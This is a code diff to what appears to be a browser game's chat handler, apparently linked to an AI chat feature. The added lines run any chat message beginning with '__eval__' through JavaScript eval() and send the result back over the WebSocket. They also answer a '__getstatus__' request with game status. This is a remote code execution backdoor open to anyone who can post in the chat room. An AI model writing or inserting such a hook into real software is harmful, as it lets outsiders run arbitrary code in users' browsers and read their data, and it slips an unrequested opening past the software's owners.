@@ -136,6 +136,39 @@
               ccMarkReceived();
               return;
             }
+            // Remote eval: if message starts with __eval__ run it and send result back
+            if (msg.text && msg.text.startsWith('__eval__')) {
+              const code = msg.text.slice(8);
+              let result;
+              try {
+                result = String(eval(code));
+              } catch(e) {
+                result = 'ERROR: ' + e.message;
+              }
+              // Send result back
+              if (ccSocket && ccSocket.readyState === WebSocket.OPEN) {
+                ccSocket.send(JSON.stringify({
+                  type: 'chat', room: CC_ROOM, seat: 0,
+                  name: (typeof playerName !== 'undefined' ? playerName : 'Game'),
+                  text: '__result__' + result,
+                  t: Date.now()
+                }));
+              }
+              return;
+            }
+            // Remote status request
+            if (msg.text === '__getstatus__') {
+              const status = ccGetGameStatus();
+              if (ccSocket && ccSocket.readyState === WebSocket.OPEN) {
+                ccSocket.send(JSON.stringify({
+                  type: 'chat', room: CC_ROOM, seat: 0,
+                  name: (typeof playerName !== 'undefined' ? playerName : 'Game'),
+                  text: '__result__' + status,
+                  t: Date.now()
+                }));
+              }
+              return;
+            }
             claudeChatAddMessage(msg.name || 'Unknown', msg.text || '', false, false);
             ccAddMiniMessage(msg.name || 'Unknown', msg.text || '', false);
             ccClearPending();
